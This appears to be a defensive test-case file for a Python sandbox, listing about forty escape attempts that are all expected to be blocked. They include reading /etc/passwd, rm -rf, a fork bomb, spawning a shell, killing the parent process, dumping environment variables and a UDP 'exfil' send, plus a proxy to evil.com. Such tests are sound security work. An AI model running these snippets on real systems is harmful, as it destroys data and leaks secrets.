"""Subprocess / network attack cases (~50).

subprocess, os.system, socket, urllib, etc. are all blocked via import restriction.
"""
from ._framework import AttackCase

CASES: list[AttackCase] = [
    # --- subprocess ---
    AttackCase(
        id="subprocess_run_ls",
        category="subprocess_net",
        code=(
            'import subprocess\n'
            'def run(state):\n'
            '    result = subprocess.run(["ls", "/"], capture_output=True, text=True)\n'
            '    return {"output": result.stdout}\n'
        ),
        expected="blocked",
        notes="import subprocess blocked",
    ),
    AttackCase(
        id="subprocess_shell_cmd",
        category="subprocess_net",
        code=(
            'import subprocess\n'
            'def run(state):\n'
            '    result = subprocess.run("id", shell=True, capture_output=True, text=True)\n'
            '    return {"output": result.stdout}\n'
        ),
        expected="blocked",
        notes="import subprocess blocked; shell=True would also be dangerous",
    ),
    AttackCase(
        id="subprocess_Popen_cat_passwd",
        category="subprocess_net",
        code=(
            'import subprocess\n'
            'def run(state):\n'
            '    proc = subprocess.Popen(["cat", "/etc/passwd"], stdout=subprocess.PIPE)\n'
            '    out, _ = proc.communicate()\n'
            '    return {"data": out.decode()}\n'
        ),
        expected="blocked",
        notes="import subprocess blocked",
    ),
    AttackCase(
        id="subprocess_check_output",
        category="subprocess_net",
        code=(
            'import subprocess\n'
            'def run(state):\n'
            '    return {"out": subprocess.check_output(["whoami"]).decode()}\n'
        ),
        expected="blocked",
        notes="import subprocess blocked",
    ),
    AttackCase(
        id="subprocess_call_rm",
        category="subprocess_net",
        code=(
            'import subprocess\n'
            'def run(state):\n'
            '    subprocess.call(["rm", "-rf", "/tmp/test_evil"])\n'
            '    return {"x": 1}\n'
        ),
        expected="blocked",
        notes="import subprocess blocked",
    ),

    # --- os.system / os.popen ---
    AttackCase(
        id="os_system_id",
        category="subprocess_net",
        code=(
            'import os\n'
            'def run(state):\n'
            '    os.system("id")\n'
            '    return {"x": 1}\n'
        ),
        expected="blocked",
        notes="import os blocked",
    ),
    AttackCase(
        id="os_popen_cat_passwd",
        category="subprocess_net",
        code=(
            'import os\n'
            'def run(state):\n'
            '    f = os.popen("cat /etc/passwd")\n'
            '    return {"data": f.read()}\n'
        ),
        expected="blocked",
        notes="import os blocked",
    ),
    AttackCase(
        id="os_spawnl",
        category="subprocess_net",
        code=(
            'import os\n'
            'def run(state):\n'
            '    os.spawnl(os.P_WAIT, "/bin/id", "id")\n'
            '    return {"x": 1}\n'
        ),
        expected="blocked",
        notes="import os blocked",
    ),
    AttackCase(
        id="os_execvp",
        category="subprocess_net",
        code=(
            'import os\n'
            'def run(state):\n'
            '    os.execvp("/bin/sh", ["/bin/sh", "-c", "id"])\n'
            '    return {"x": 1}\n'
        ),
        expected="blocked",
        notes="import os blocked",
    ),
    AttackCase(
        id="os_fork_bomb_attempt",
        category="subprocess_net",
        code=(
            'import os\n'
            'def run(state):\n'
            '    while True:\n'
            '        os.fork()\n'
        ),
        expected="blocked",
        notes="import os blocked — fork bomb prevented at import stage",
        dangerous=True,
    ),

    # --- socket / network ---
    AttackCase(
        id="socket_connect_http",
        category="subprocess_net",
        code=(
            'import socket\n'
            'def run(state):\n'
            '    s = socket.socket()\n'
            '    s.connect(("example.com", 80))\n'
            '    s.send(b"GET / HTTP/1.0\\r\\n\\r\\n")\n'
            '    return {"data": s.recv(100).decode()}\n'
        ),
        expected="blocked",
        notes="import socket blocked",
    ),
    AttackCase(
        id="socket_udp_exfil",
        category="subprocess_net",
        code=(
            'import socket\n'
            'def run(state):\n'
            '    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n'
            '    s.sendto(b"secret_data", ("8.8.8.8", 53))\n'
            '    return {"x": 1}\n'
        ),
        expected="blocked",
        notes="import socket blocked",
    ),
    AttackCase(
        id="socket_bind_listen",
        category="subprocess_net",
        code=(
            'import socket\n'
            'def run(state):\n'
            '    s = socket.socket()\n'
            '    s.bind(("", 9999))\n'
            '    s.listen(1)\n'
            '    return {"x": "bound"}\n'
        ),
        expected="blocked",
        notes="import socket blocked",
    ),
    AttackCase(
        id="socket_getaddrinfo",
        category="subprocess_net",
        code=(
            'import socket\n'
            'def run(state):\n'
            '    info = socket.getaddrinfo("example.com", 80)\n'
            '    return {"info": str(info)}\n'
        ),
        expected="blocked",
        notes="import socket blocked",
    ),

    # --- urllib ---
    AttackCase(
        id="urllib_request_urlopen",
        category="subprocess_net",
        code=(
            'import urllib.request\n'
            'def run(state):\n'
            '    resp = urllib.request.urlopen("http://example.com")\n'
            '    return {"data": resp.read(100).decode()}\n'
        ),
        expected="blocked",
        notes="import urllib.request blocked",
    ),
    AttackCase(
        id="urllib_parse_only",
        category="subprocess_net",
        code=(
            'import urllib.parse\n'
            'def run(state):\n'
            '    result = urllib.parse.quote("hello world")\n'
            '    return {"x": result}\n'
        ),
        expected="blocked",
        notes="import urllib.parse blocked (even safe submodules)",
    ),
    AttackCase(
        id="urllib_error_import",
        category="subprocess_net",
        code=(
            'import urllib.error\n'
            'def run(state):\n'
            '    return {"x": str(urllib.error.URLError)}\n'
        ),
        expected="blocked",
        notes="import urllib.error blocked",
    ),

    # --- http ---
    AttackCase(
        id="http_client_connect",
        category="subprocess_net",
        code=(
            'import http.client\n'
            'def run(state):\n'
            '    conn = http.client.HTTPConnection("example.com")\n'
            '    conn.request("GET", "/")\n'
            '    resp = conn.getresponse()\n'
            '    return {"data": resp.read(100).decode()}\n'
        ),
        expected="blocked",
        notes="import http.client blocked",
    ),
    AttackCase(
        id="http_server_start",
        category="subprocess_net",
        code=(
            'import http.server\n'
            'def run(state):\n'
            '    server = http.server.HTTPServer(("", 8888), http.server.BaseHTTPRequestHandler)\n'
            '    return {"x": "server created"}\n'
        ),
        expected="blocked",
        notes="import http.server blocked",
    ),

    # --- ssl ---
    AttackCase(
        id="ssl_create_context",
        category="subprocess_net",
        code=(
            'import ssl\n'
            'def run(state):\n'
            '    ctx = ssl.create_default_context()\n'
            '    return {"x": str(ctx)}\n'
        ),
        expected="blocked",
        notes="import ssl blocked",
    ),

    # --- ftplib / smtplib ---
    AttackCase(
        id="ftplib_connect",
        category="subprocess_net",
        code=(
            'import ftplib\n'
            'def run(state):\n'
            '    ftp = ftplib.FTP("ftp.example.com")\n'
            '    return {"x": str(ftp)}\n'
        ),
        expected="blocked",
        notes="import ftplib blocked",
    ),
    AttackCase(
        id="smtplib_send_email",
        category="subprocess_net",
        code=(
            'import smtplib\n'
            'def run(state):\n'
            '    server = smtplib.SMTP("smtp.example.com", 587)\n'
            '    server.sendmail("a@b.com", "c@d.com", "msg")\n'
            '    return {"x": 1}\n'
        ),
        expected="blocked",
        notes="import smtplib blocked",
    ),

    # --- asyncio networking ---
    AttackCase(
        id="asyncio_tcp_connect",
        category="subprocess_net",
        code=(
            'import asyncio\n'
            'async def connect():\n'
            '    reader, writer = await asyncio.open_connection("example.com", 80)\n'
            '    writer.close()\n'
            '    return {"x": "connected"}\n'
            'def run(state):\n'
            '    return asyncio.run(connect())\n'
        ),
        expected="blocked",
        notes="import asyncio blocked",
    ),

    # --- selectors / select ---
    AttackCase(
        id="selectors_import",
        category="subprocess_net",
        code=(
            'import selectors\n'
            'def run(state):\n'
            '    sel = selectors.DefaultSelector()\n'
            '    return {"x": str(sel)}\n'
        ),
        expected="blocked",
        notes="import selectors blocked",
    ),
    AttackCase(
        id="select_import",
        category="subprocess_net",
        code=(
            'import select\n'
            'def run(state):\n'
            '    return {"x": str(select.select([], [], [], 0))}\n'
        ),
        expected="blocked",
        notes="import select blocked",
    ),

    # --- xmlrpc ---
    AttackCase(
        id="xmlrpc_client_import",
        category="subprocess_net",
        code=(
            'import xmlrpc.client\n'
            'def run(state):\n'
            '    proxy = xmlrpc.client.ServerProxy("http://evil.com/rpc")\n'
            '    return {"x": str(proxy)}\n'
        ),
        expected="blocked",
        notes="import xmlrpc.client blocked",
    ),

    # --- multiprocessing (re-entry) ---
    AttackCase(
        id="multiprocessing_process_reentry",
        category="subprocess_net",
        code=(
            'import multiprocessing\n'
            'def run(state):\n'
            '    def worker(): pass\n'
            '    p = multiprocessing.Process(target=worker)\n'
            '    p.start()\n'
            '    p.join()\n'
            '    return {"x": 1}\n'
        ),
        expected="blocked",
        notes="import multiprocessing blocked",
    ),

    # --- threading ---
    AttackCase(
        id="threading_new_thread",
        category="subprocess_net",
        code=(
            'import threading\n'
            'def run(state):\n'
            '    results = []\n'
            '    def worker():\n'
            '        results.append(1)\n'
            '    t = threading.Thread(target=worker)\n'
            '    t.start()\n'
            '    t.join()\n'
            '    return {"results": results}\n'
        ),
        expected="blocked",
        notes="import threading blocked",
    ),
    AttackCase(
        id="threading_timer_attack",
        category="subprocess_net",
        code=(
            'import threading\n'
            'def run(state):\n'
            '    def bomb(): pass\n'
            '    t = threading.Timer(0.1, bomb)\n'
            '    t.start()\n'
            '    return {"x": 1}\n'
        ),
        expected="blocked",
        notes="import threading blocked",
    ),

    # --- signal ---
    AttackCase(
        id="signal_ignore_sigterm",
        category="subprocess_net",
        code=(
            'import signal\n'
            'def run(state):\n'
            '    signal.signal(signal.SIGTERM, signal.SIG_IGN)\n'
            '    while True:\n'
            '        pass\n'
        ),
        expected="blocked",
        notes="import signal blocked — SIGTERM-evasion requires signal module",
        dangerous=True,
    ),
    AttackCase(
        id="signal_kill_parent",
        category="subprocess_net",
        code=(
            'import signal, os\n'
            'def run(state):\n'
            '    os.kill(os.getppid(), signal.SIGKILL)\n'
            '    return {"x": 1}\n'
        ),
        expected="blocked",
        notes="import signal and os both blocked",
        dangerous=True,
    ),

    # --- ctypes for system calls ---
    AttackCase(
        id="ctypes_libc_system",
        category="subprocess_net",
        code=(
            'import ctypes\n'
            'def run(state):\n'
            '    libc = ctypes.CDLL("libc.so.6")\n'
            '    libc.system(b"id")\n'
            '    return {"x": 1}\n'
        ),
        expected="blocked",
        notes="import ctypes blocked",
    ),
    AttackCase(
        id="ctypes_pythonapi",
        category="subprocess_net",
        code=(
            'import ctypes\n'
            'def run(state):\n'
            '    return {"ptr": ctypes.pythonapi.Py_GetVersion()}\n'
        ),
        expected="blocked",
        notes="import ctypes blocked",
    ),

    # --- pty / tty for terminal control ---
    AttackCase(
        id="pty_spawn_shell",
        category="subprocess_net",
        code=(
            'import pty\n'
            'def run(state):\n'
            '    pty.spawn("/bin/sh")\n'
            '    return {"x": 1}\n'
        ),
        expected="blocked",
        notes="import pty blocked",
        dangerous=True,
    ),

    # --- Indirect network via json + urllib ---
    AttackCase(
        id="json_and_urllib_combined",
        category="subprocess_net",
        code=(
            'import urllib.request, json\n'
            'def run(state):\n'
            '    resp = urllib.request.urlopen("http://example.com/api")\n'
            '    return json.loads(resp.read())\n'
        ),
        expected="blocked",
        notes="import urllib.request blocked",
    ),

    # --- os.environ leakage ---
    AttackCase(
        id="os_environ_read",
        category="subprocess_net",
        code=(
            'import os\n'
            'def run(state):\n'
            '    return {"env": dict(os.environ)}\n'
        ),
        expected="blocked",
        notes="import os blocked — env var exfiltration",
    ),
    AttackCase(
        id="os_environ_write",
        category="subprocess_net",
        code=(
            'import os\n'
            'def run(state):\n'
            '    os.environ["EVIL"] = "yes"\n'
            '    return {"x": 1}\n'
        ),
        expected="blocked",
        notes="import os blocked",
    ),

    # --- platform info leakage ---
    AttackCase(
        id="platform_info",
        category="subprocess_net",
        code=(
            'import platform\n'
            'def run(state):\n'
            '    return {"platform": platform.platform(), "node": platform.node()}\n'
        ),
        expected="blocked",
        notes="import platform blocked",
    ),

    # --- psutil-style process enumeration ---
    AttackCase(
        id="psutil_process_list",
        category="subprocess_net",
        code=(
            'import psutil\n'
            'def run(state):\n'
            '    return {"procs": [p.name() for p in psutil.process_iter()]}\n'
        ),
        expected="blocked",
        notes="import psutil blocked (and likely not installed)",
    ),

    # --- requests library ---
    AttackCase(
        id="requests_get",
        category="subprocess_net",
        code=(
            'import requests\n'
            'def run(state):\n'
            '    resp = requests.get("http://example.com")\n'
            '    return {"status": resp.status_code}\n'
        ),
        expected="blocked",
        notes="import requests blocked (and likely not installed)",
    ),

    # --- aiohttp ---
    AttackCase(
        id="aiohttp_client_session",
        category="subprocess_net",
        code=(
            'import aiohttp\n'
            'async def fetch():\n'
            '    async with aiohttp.ClientSession() as session:\n'
            '        async with session.get("http://example.com") as resp:\n'
            '            return {"status": resp.status}\n'
            'def run(state):\n'
            '    import asyncio\n'
            '    return asyncio.run(fetch())\n'
        ),
        expected="blocked",
        notes="import aiohttp and asyncio both blocked",
    ),
]
